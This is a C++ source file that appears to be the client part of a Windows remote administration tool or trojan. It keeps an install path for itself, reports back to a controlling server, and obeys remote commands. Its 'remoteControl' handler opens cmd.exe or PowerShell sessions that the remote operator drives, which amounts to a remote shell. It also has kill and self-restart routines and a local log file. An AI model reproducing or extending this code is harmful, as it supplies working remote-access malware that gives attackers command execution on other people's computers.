#include "general.h"

std::string General::currentPath;			//current path of executable
std::string General::installFolder;		//path of folder it should be installed to
std::string General::installPath;			//full path where executable should be installed to
bool General::installing;			//bool - defines whether the file is currently being installed (and should be terminated after the initiation sequence,
									//instead of proceeding to the main loop)
LPTSTR General::lpArguments;

void General::startProcess(LPCTSTR lpApplicationName, LPTSTR lpArguments)		//starts a process
{
	// additional information
	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	// set the size of the structures
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	// start the program up
	CreateProcess(lpApplicationName,   // the path
		lpArguments,        // Command line
		NULL,           // Process handle not inheritable
		NULL,           // Thread handle not inheritable
		FALSE,          // Set handle inheritance to FALSE
		0,              // No creation flags
		NULL,           // Use parent's environment block
		NULL,           // Use parent's starting directory 
		&si,            // Pointer to STARTUPINFO structure
		&pi);           // Pointer to PROCESS_INFORMATION structure
						// Close process and thread handles. 
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

void General::handleError(int errType, bool errSevere)	//handles errors
{
	if (errSevere)
	{
		restartSelf();
	}
	else
	{
		switch (errType)
		{
		case 1:		//general error
			Client::clientptr->SendString("General error", PacketType::Warning);
			return;
		case 2:		//cmd error		
			Client::clientptr->SendString("CMD error", PacketType::Warning);
			return;
		case 3:		//networking error
			Client::clientptr->SendString("Networking error", PacketType::Warning);
			return;
		}

	}

}

bool General::processParameter(std::string &command, std::string compCommand)
{
	std::string::size_type i = command.find(compCommand);
	if (i != std::string::npos)
	{
		command.erase(i, compCommand.length() + 1);
		return true;
	}
	else
		return false;
}

std::string General::processCommand(std::string command)
{
	if (command == "kill")
	{
		killSelf();
		return "killing self";
	}
	else if (command == "restart")
	{
		restartSelf();
		return "restarting";
	}

	else if (processParameter(command, "remoteControl"))
	{
		if (!CMD::cmdOpen)
		{
			if (command == "cmd")
				command = "C:\\WINDOWS\\system32\\cmd.exe";
			else if (command == "pws")
				command = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
			else if (command == "pws32")
				command = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe";

			if (FileExists(command.c_str()))
			{
				char* buffer = new char[command.length() + 3];
				buffer[command.length()] = '\0';
				strcpy_s(buffer, command.length() + 2, command.c_str());

				_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)CMD::cmdThread, (LPVOID)buffer, NULL, NULL);
				while (!CMD::cmdOpen)
				{
					Sleep(50);
				}
				delete[] buffer;
				return "CMD session opened.";
			}
			else
				return "File doesn't exist.";
		}
		else
		{
			CMD::cmdptr->writeCMD("exit");
			CMD::cmdOpen = false;
			return "CMD session closed";
		}
	}
	else
	{
		return "Command '" + command + "' was not recognized.";
	}
}

void General::restartSelf()
{
	Client::clientptr->SendString("Restart requested: Restarting self", PacketType::Warning);
	startProcess(currentPath.c_str(), NULL);
	exit(0);
}

void General::killSelf()
{
	Client::clientptr->SendString("Termination requested: Killing self", PacketType::Warning);
	Client::clientptr->CloseConnection();
	exit(0);
}

std::string General::currentDateTime()
{
	time_t     now = time(0);
	struct tm  tstruct;
	char       buf[80];
	localtime_s(&tstruct, &now);
	strftime(buf, sizeof(buf), "%d/%m/%Y [%X]", &tstruct);

	return buf;
}
void General::log(std::string message)
{
	std::ofstream logFile;
	logFile.open(installFolder + "\\" + Settings::logFileName, std::ios_base::app);
	logFile << currentDateTime() << ": " << message << std::endl;
	logFile.close();
}
